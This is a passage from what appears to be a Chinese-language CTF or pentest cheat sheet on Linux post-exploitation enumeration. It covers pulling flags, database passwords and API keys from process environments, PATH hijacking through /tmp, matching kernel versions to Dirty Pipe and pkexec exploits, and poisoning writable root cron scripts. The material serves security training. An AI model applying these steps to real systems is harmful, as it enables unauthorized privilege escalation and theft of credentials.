环境变量在 `/proc/PID/environ` 里以 NUL（`\0`）分隔，直接 cat 会连成一坨，`tr '\0' '\n'` 转成一行一个。**容器场景：`docker run -e FLAG=xxx` 注入的变量在 PID 1 的环境里，`cat /proc/1/environ` 一抓一个准。**

#### 第 3 步：PATH 与变量操作（提权预备）
```bash
echo $PATH                 # 看命令搜索路径顺序
export VAR=value           # 临时导出变量（当前 shell 有效）
export PATH=/tmp:$PATH     # 把 /tmp 加到 PATH 最前面——PATH 劫持提权的基础操作
unset VAR                  # 删除变量
printenv PATH
```

PATH 劫持原理：root 的 cron 脚本里写了 `ps aux`（不带绝对路径），如果脚本执行时 PATH 里 `/tmp` 在前面，而 `/tmp/ps` 是我们放的恶意副本，root 就会执行我们的程序——详见提权组的 [path-cron-abuse]。

#### 第 4 步：查看内核与系统版本
```bash
uname -r                # 内核版本号（如 5.10.102），查已知漏洞用
uname -a                # 完整内核信息（含架构、主机名）
cat /etc/os-release     # 发行版与版本（如 Debian GNU/Linux 11）
cat /etc/redhat-release /etc/lsb-release 2>/dev/null
```

**预期结果**：`uname -r` 输出如 `5.4.0-132-generic`。拿到版本号后对表：≤5.16 可能存在 Dirty Pipe（CVE-2022-0847）、某些 ≤5.11 版本存在 OverlayFS/io_uring 提权链。版本越老，可利用的已知 CVE 越多。

#### 第 5 步：查看当前用户的 crontab
```bash
crontab -l              # 列出当前用户的定时任务
crontab -u root -l      # 有权限时看 root 的（普通用户会报"不允许"）
cat /etc/crontab        # 系统级 crontab（谁都能读，第一优先看它）
```

`crontab -l` 空输出 = 没有该用户的定时任务，不代表系统干净——还要查第 6 步的各个 cron 目录和 systemd timer（见 sysctl-service 条目）。

#### 第 6 步：扫全系统 cron 目录（提权重灾区）
```bash
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /var/spool/cron/ 2>/dev/null
cat /etc/crontab
for f in /etc/cron.d/* /etc/cron.daily/*; do echo "=== $f"; cat "$f" 2>/dev/null; done
```

**预期结果**：看到类似 `*/5 * * * * root /opt/scripts/cleanup.sh` 的行。**立刻检查指到的脚本是否可写**：

```bash
ls -la /opt/scripts/cleanup.sh        # 属主是当前用户？或 o+w 其他可写？
```

如果 root 的定时任务执行了一个**当前用户可写**的脚本，直接写入 payload 等下一轮执行就是一条完整提权链（见 [path-cron-abuse] 的投毒手法）。

#### 第 7 步：理解 crontab 格式
```txt
# 五段格式：分 时 日 月 周
*/5 * * * * /usr/local/bin/cleanup.sh     # 每 5 分钟（分的 0/5/10/15...）执行一次
@reboot /opt/start.sh                     # 开机时执行（@reboot 常见于留后门）
0 3 * * * tar czf /backup/$(date +\%F).tar.gz /var/www    # 每天 3 点备份
```

读法：`分 时 日 月 周`，`*` 表示任意，`*/5` 表示每 5 个单位的间隔。注意 cron 里 `%` 要转义成 `\%`（上例 date 参数），否则会被 cron 截断——面试/填表常见的坑。

#### 第 8 步：翻 cron 日志确认执行情况
```bash
journalctl -u cron -n 50 2>/dev/null     # Debian/Ubuntu 的 cron 服务日志
tail -n 50 /var/log/cron 2>/dev/null      # RHEL/CentOS 路径
grep CRON /var/log/syslog 2>/dev/null     # 老 syslog 里也能抠出来
```

写入了投毒 payload 后，用日志确认脚本确实在按预期时间执行（看到 `CMD (/opt/scripts/cleanup.sh)` 即命中）。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `crontab -u root -l` 报权限错误 | 普通用户不能看 root 的 | 改看 `/etc/crontab` 和 `/etc/cron.d/`（全局可读） |
| `crontab: no crontab for user` | 该用户没有任务 | 不是错误，继续看系统级 cron 与 timer |
| env 里没 flag | flag 在别的进程环境 | `cat /proc/1/environ`、遍历 `/proc/[0-9]*/environ` |
| `uname -r` 版本很新 | 新内核无公开提权 | 转投 sudo/SUID/cron 可写等配置型提权 |
| cron 命令没生效 | 语法错或脚本不可执行 | 检查五段格式与 `chmod +x`；看 `/var/log/cron` 的 `CRON` 行 |
| 脚本里命令 404 找不到 | cron 环境 PATH 精简 | `which 命令` 确认绝对路径，或脚本内写 `export PATH=/usr/local/sbin:...` |

#### 实战要点
- 拿 shell 顺序固定：`env | grep -i flag` → `cat /proc/1/environ` → `cat /etc/crontab` + 各 cron 目录 → `uname -r`。四条命令三分钟查完信息收集大头。
- 环境变量里的敏感信息优先级最高：flag、数据库密码、第三方 API Key（配合 grep 通用词表扫）。
- cron 脚本可写投毒是"等下一轮"的耐心活：写入后 `tail -f /var/log/cron` 盯执行确认，别反复重启 cron 或删任务。
- 内核提权有版本窗口：拿到 `uname -r` 先对表 Dirty Pipe（≤5.16.11）、CVE-2021-4034 pkexec（≤2021 系列）、OverlayFS 系列——能秒提就秒提，别去啃难的服务配置提权。
- cron 环境是精简 PATH，脚本里用相对命令名 = PATH 劫持机会；审计 root 脚本时 grep 出所有不带绝对路径的命令，再检查对应目录可写性。